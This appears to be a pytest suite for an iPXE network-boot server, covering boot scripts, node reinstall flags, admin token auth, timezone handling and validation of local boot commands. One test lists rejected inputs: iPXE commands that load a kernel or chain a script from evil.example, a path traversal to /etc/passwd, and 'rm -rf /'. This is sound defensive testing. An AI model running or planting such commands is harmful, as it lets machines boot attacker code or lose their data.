"""
Tests for HTTP endpoints and route helpers: /health, /chain, /boot, /nodes,
reinstall toggles, and admin auth. Uses fixtures from conftest (client, reset_db).
"""

from datetime import datetime, timedelta, timezone
from zoneinfo import ZoneInfo

import pytest
from sqlalchemy.exc import StatementError


def test_health_returns_ok(client):
    """GET /health returns 200 and status OK."""
    r = client.get("/health")
    assert r.status_code == 200
    assert r.get_json() == {"status": "OK"}


def test_chain_returns_ipxe_script(client):
    """GET /chain returns 200 and iPXE script that chains to /boot and has fallback."""
    r = client.get("/chain")
    assert r.status_code == 200
    assert "text/plain" in (r.content_type or "")
    body = r.get_data(as_text=True)
    assert body.startswith("#!ipxe")
    assert "/boot" in body
    assert "fallback" in body and "exit" in body


def test_boot_missing_mac_returns_400(client):
    """GET /boot without mac query param returns 400."""
    r = client.get("/boot")
    assert r.status_code == 400
    assert "mac" in r.get_data(as_text=True).lower()


def test_boot_invalid_mac_returns_400(client):
    """GET /boot with invalid mac returns 400."""
    r = client.get("/boot", query_string={"mac": "not-a-mac"})
    assert r.status_code == 400


def test_boot_valid_mac_creates_node_returns_local_disk(client):
    """GET /boot with valid MAC creates node with reinstall=False and returns local disk script."""
    r = client.get("/boot", query_string={"mac": "aa:bb:cc:dd:ee:ff"})
    assert r.status_code == 200
    body = r.get_data(as_text=True)
    assert body.startswith("#!ipxe")
    # Default local boot script is "exit" - no explicit sanboot command.
    assert "exit" in body
    assert "kernel" not in body

    r2 = client.get("/nodes")
    assert r2.status_code == 200
    nodes = r2.get_json()["nodes"]
    assert len(nodes) == 1
    assert nodes[0]["mac"] == "aa:bb:cc:dd:ee:ff"
    assert nodes[0]["reinstall"] is False
    assert nodes[0]["last_seen"] is not None


def test_boot_normalizes_mac_formats(client):
    """GET /boot accepts hyphenated and no-separator MAC; node is stored lowercase colon."""
    for raw in ("AA-BB-CC-DD-EE-FF", "aabbccddeeff"):
        r = client.get("/boot", query_string={"mac": raw})
        assert r.status_code == 200
    r = client.get("/nodes")
    nodes = r.get_json()["nodes"]
    macs = [n["mac"] for n in nodes]
    assert "aa:bb:cc:dd:ee:ff" in macs


def test_boot_with_reinstall_true_returns_uki_script(client):
    """When node has reinstall=True, GET /boot returns Ubuntu UKI iPXE script."""
    mac = "11:22:33:44:55:66"
    client.post(f"/nodes/{mac}/reinstall")
    r = client.get("/boot", query_string={"mac": mac})
    assert r.status_code == 200
    body = r.get_data(as_text=True)
    assert body.startswith("#!ipxe")
    assert "imgfree" in body
    assert "chain" in body and "uki.efi" in body
    assert "autoinstall" in body and "ds=nocloud-net" in body
    assert "ip=dhcp" in body


def test_list_nodes_empty(client):
    """GET /nodes with no admin key returns empty list when no nodes."""
    r = client.get("/nodes")
    assert r.status_code == 200
    assert r.get_json() == {"nodes": []}


def test_list_nodes_after_boot(client):
    """GET /nodes returns nodes created via /boot."""
    client.get("/boot", query_string={"mac": "aa:11:bb:22:cc:33"})
    r = client.get("/nodes")
    assert r.status_code == 200
    nodes = r.get_json()["nodes"]
    assert len(nodes) == 1
    assert nodes[0]["mac"] == "aa:11:bb:22:cc:33"
    assert "created_at" in nodes[0]
    assert "last_seen" in nodes[0]


def test_post_reinstall_creates_or_sets_true(client):
    """POST /nodes/<mac>/reinstall sets reinstall=True; creates node if missing."""
    mac = "de:ad:be:ef:00:11"
    r = client.post(f"/nodes/{mac}/reinstall")
    assert r.status_code == 200
    data = r.get_json()
    assert data["mac"] == mac
    assert data["reinstall"] is True

    r2 = client.get("/nodes")
    nodes = r2.get_json()["nodes"]
    assert any(n["mac"] == mac and n["reinstall"] is True for n in nodes)


def test_delete_reinstall_sets_false(client):
    """DELETE /nodes/<mac>/reinstall sets reinstall=False."""
    mac = "ca:fe:ba:be:00:11"
    client.post(f"/nodes/{mac}/reinstall")
    r = client.delete(f"/nodes/{mac}/reinstall")
    assert r.status_code == 200
    assert r.get_json() == {"mac": mac, "reinstall": False}

    r2 = client.get("/nodes")
    nodes = r2.get_json()["nodes"]
    assert any(n["mac"] == mac and n["reinstall"] is False for n in nodes)


def test_reinstall_invalid_mac_returns_400(client):
    """POST/DELETE reinstall with invalid MAC returns 400."""
    r1 = client.post("/nodes/invalid/reinstall")
    r2 = client.delete("/nodes/invalid/reinstall")
    assert r1.status_code == 400
    assert r2.status_code == 400
    assert "error" in r1.get_json()
    assert "error" in r2.get_json()


def test_admin_auth_required_when_key_set(client, monkeypatch):
    """When ADMIN_API_KEY is set, GET /nodes and reinstall require Bearer token."""
    monkeypatch.setattr("app.routes.common.ADMIN_API_KEY", "secret")
    r = client.get("/nodes")
    assert r.status_code == 401
    assert "error" in r.get_json()

    r2 = client.get("/nodes", headers={"Authorization": "Bearer wrong"})
    assert r2.status_code == 401

    r3 = client.get("/nodes", headers={"Authorization": "Bearer secret"})
    assert r3.status_code == 200


def test_column_round_trips_tz_aware_utc(client):
    """
    Every read from a UTCDateTime column must come back tz-aware in UTC.
    Guards regressions where the column type silently reverts to plain
    DateTime (which strips tzinfo on SQLite).
    """
    from app.db import get_db
    from app.models import Node

    client.get("/boot", query_string={"mac": "aa:bb:cc:dd:ee:ff"})

    db = next(get_db())
    try:
        node = db.query(Node).filter(Node.mac == "aa:bb:cc:dd:ee:ff").first()
        assert node is not None
        for label, value in [("created_at", node.created_at), ("last_seen", node.last_seen)]:
            assert value is not None, f"{label} unexpectedly None"
            assert value.tzinfo is not None, f"{label} must be tz-aware on read"
            assert value.utcoffset().total_seconds() == 0, f"{label} must be UTC, got {value.utcoffset()}"
    finally:
        db.close()


def test_column_normalises_non_utc_input_to_utc(client):
    """
    Writing a tz-aware datetime in any offset (e.g. +09:00) must land as
    UTC in storage, preserving the underlying instant. This is what makes
    "store UTC, display in TIMEZONE" actually true regardless of how the
    caller constructed the datetime.
    """
    from app.db import get_db
    from app.models import Node

    client.get("/boot", query_string={"mac": "aa:bb:cc:dd:ee:ff"})

    jst = timezone(timedelta(hours=9))
    # Pick a fixed wall-clock instant in JST; the same instant in UTC is
    # 9 hours earlier - that's what the row should contain after the
    # round-trip.
    jst_value = datetime(2026, 5, 22, 8, 0, 0, tzinfo=jst)
    expected_utc = datetime(2026, 5, 21, 23, 0, 0, tzinfo=timezone.utc)

    db = next(get_db())
    try:
        node = db.query(Node).filter(Node.mac == "aa:bb:cc:dd:ee:ff").first()
        node.last_seen = jst_value
        db.commit()
        db.refresh(node)
        assert node.last_seen == expected_utc, f"got {node.last_seen!r}, want {expected_utc!r}"
        assert node.last_seen.utcoffset().total_seconds() == 0
    finally:
        db.close()


def test_column_rejects_naive_datetime(client):
    """
    Assigning a naive datetime to a UTCDateTime column must raise on
    commit (SQLAlchemy wraps the decorator's ValueError in StatementError).
    Forces every writer to be explicit about offset.
    """
    from app.db import get_db
    from app.models import Node

    client.get("/boot", query_string={"mac": "aa:bb:cc:dd:ee:ff"})

    db = next(get_db())
    try:
        node = db.query(Node).filter(Node.mac == "aa:bb:cc:dd:ee:ff").first()
        node.last_seen = datetime.now()  # naive on purpose
        with pytest.raises(StatementError) as exc:
            db.commit()
        assert "naive datetime" in str(exc.value), exc.value
        db.rollback()
    finally:
        db.close()


def test_timestamps_default_utc_offset(client):
    """
    With TIMEZONE unset (default UTC), serialised timestamps must carry an
    explicit +00:00 offset and be parseable by datetime.fromisoformat. Guards
    the regression where SQLite-stripped tzinfo produced naive ISO strings.
    """
    client.get("/boot", query_string={"mac": "aa:bb:cc:dd:ee:ff"})
    nodes = client.get("/nodes").get_json()["nodes"]
    assert len(nodes) == 1
    created = nodes[0]["created_at"]
    last_seen = nodes[0]["last_seen"]
    assert created.endswith("+00:00"), created
    assert last_seen.endswith("+00:00"), last_seen
    parsed = datetime.fromisoformat(created)
    assert parsed.utcoffset().total_seconds() == 0


def test_timestamps_use_configured_timezone(client, monkeypatch):
    """
    Monkeypatching app.models.TIMEZONE to Asia/Tokyo flips the serialised
    offset to +09:00 while preserving the underlying UTC instant - i.e. the
    same row is just rendered with a different offset, not shifted in time.
    """
    import app.models as models

    monkeypatch.setattr(models, "TIMEZONE", ZoneInfo("Asia/Tokyo"))

    client.get("/boot", query_string={"mac": "aa:bb:cc:dd:ee:ff"})
    nodes = client.get("/nodes").get_json()["nodes"]
    created = nodes[0]["created_at"]
    assert created.endswith("+09:00"), created
    # The instant should match the wall-clock now() within a generous skew.
    now_utc = datetime.now(tz=ZoneInfo("UTC"))
    delta = abs((now_utc - datetime.fromisoformat(created)).total_seconds())
    assert delta < 30, f"timestamp drift {delta}s suggests TZ conversion changed the instant"


def test_admin_auth_post_delete_reinstall_required(client, monkeypatch):
    """POST and DELETE reinstall require Bearer when ADMIN_API_KEY is set."""
    monkeypatch.setattr("app.routes.common.ADMIN_API_KEY", "secret")
    mac = "aa:bb:cc:dd:ee:ff"
    r1 = client.post(f"/nodes/{mac}/reinstall")
    r2 = client.delete(f"/nodes/{mac}/reinstall")
    assert r1.status_code == 401
    assert r2.status_code == 401

    r3 = client.post(f"/nodes/{mac}/reinstall", headers={"Authorization": "Bearer secret"})
    assert r3.status_code == 200
    r4 = client.delete(f"/nodes/{mac}/reinstall", headers={"Authorization": "Bearer secret"})
    assert r4.status_code == 200


def test_nodes_includes_local_boot_script_field(client):
    """GET /nodes includes local_boot_script in every node entry (null by default)."""
    client.get("/boot", query_string={"mac": "aa:bb:cc:dd:ee:ff"})
    nodes = client.get("/nodes").get_json()["nodes"]
    assert len(nodes) == 1
    assert "local_boot_script" in nodes[0]
    assert nodes[0]["local_boot_script"] is None


def test_set_local_boot_script_sanboot_bios(client):
    """PUT /nodes/<mac>/local-boot-config stores sanboot 0x80; next /boot returns that command."""
    mac = "aa:bb:cc:dd:ee:ff"
    script = "sanboot --no-describe --drive 0x80"
    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": script})
    assert r.status_code == 200
    assert r.get_json() == {"mac": mac, "local_boot_script": script}

    # /boot now returns the sanboot command instead of exit.
    boot_body = client.get("/boot", query_string={"mac": mac}).get_data(as_text=True)
    assert "sanboot" in boot_body
    assert "0x80" in boot_body


def test_set_local_boot_script_sanboot_uefi_drive_zero(client):
    """sanboot --no-describe --drive 0 (UEFI first disk) is a valid script."""
    mac = "bb:cc:dd:ee:ff:00"
    script = "sanboot --no-describe --drive 0"
    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": script})
    assert r.status_code == 200
    assert r.get_json()["local_boot_script"] == script


def test_set_local_boot_script_sanboot_uefi_second_disk(client):
    """sanboot with drive 1 selects the UEFI second disk."""
    mac = "cc:dd:ee:ff:00:11"
    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "sanboot --no-describe --drive 1"})
    assert r.status_code == 200


def test_set_local_boot_script_sanboot_with_filename(client):
    """sanboot with --filename for a specific EFI binary is accepted."""
    mac = "dd:ee:ff:00:11:22"
    script = r"sanboot --no-describe --drive 0 --filename \EFI\ubuntu\grubx64.efi"
    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": script})
    assert r.status_code == 200


def test_set_local_boot_script_exit_explicit(client):
    """Setting script to "exit" is explicitly valid."""
    mac = "ee:ff:00:11:22:33"
    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "exit"})
    assert r.status_code == 200


def test_set_local_boot_script_invalid_rejects(client):
    """Unknown or dangerous script values return 400."""
    mac = "ff:00:11:22:33:44"
    for bad in [
        "kernel http://evil.example/linux",
        "chain http://evil.example/script.ipxe",
        "sanboot --unknown-flag",
        "sanboot --drive ../../../../etc/passwd",
        "rm -rf /",
        "",
    ]:
        r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": bad})
        assert r.status_code == 400, f"Expected 400 for script={bad!r}, got {r.status_code}"


def test_set_local_boot_script_missing_key_returns_400(client):
    """PUT /nodes/<mac>/local-boot-config without 'script' key returns 400."""
    mac = "aa:bb:cc:dd:ee:ff"
    r = client.put(f"/nodes/{mac}/local-boot-config", json={"command": "exit"})
    assert r.status_code == 400
    assert "script" in r.get_json()["error"].lower()


def test_delete_local_boot_script_resets_to_exit(client):
    """DELETE /nodes/<mac>/local-boot-config clears the script; /boot falls back to exit."""
    mac = "aa:bb:cc:dd:ee:ff"
    client.put(f"/nodes/{mac}/local-boot-config", json={"script": "sanboot --no-describe --drive 0x80"})

    r = client.delete(f"/nodes/{mac}/local-boot-config")
    assert r.status_code == 200
    assert r.get_json() == {"mac": mac, "local_boot_script": None}

    # After clearing, /boot must return plain exit again.
    boot_body = client.get("/boot", query_string={"mac": mac}).get_data(as_text=True)
    assert "exit" in boot_body
    assert "sanboot" not in boot_body


def test_local_boot_invalid_mac_returns_400(client):
    """PUT/DELETE local-boot-config with invalid MAC returns 400."""
    r1 = client.put("/nodes/invalid/local-boot-config", json={"script": "exit"})
    r2 = client.delete("/nodes/invalid/local-boot-config")
    assert r1.status_code == 400
    assert r2.status_code == 400


def test_set_local_boot_creates_node_if_missing(client):
    """PUT /nodes/<mac>/local-boot-config creates the node entry if it doesn't exist yet."""
    mac = "11:22:33:44:55:77"
    r = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "sanboot --no-describe --drive 0"})
    assert r.status_code == 200
    nodes = client.get("/nodes").get_json()["nodes"]
    assert any(n["mac"] == mac and n["local_boot_script"] == "sanboot --no-describe --drive 0" for n in nodes)


def test_admin_auth_required_for_local_boot(client, monkeypatch):
    """PUT/DELETE local-boot-config require Bearer token when ADMIN_API_KEY is set."""
    monkeypatch.setattr("app.routes.common.ADMIN_API_KEY", "secret")
    mac = "aa:bb:cc:dd:ee:ff"
    r1 = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "exit"})
    r2 = client.delete(f"/nodes/{mac}/local-boot-config")
    assert r1.status_code == 401
    assert r2.status_code == 401

    r3 = client.put(f"/nodes/{mac}/local-boot-config", json={"script": "exit"},
                    headers={"Authorization": "Bearer secret"})
    assert r3.status_code == 200
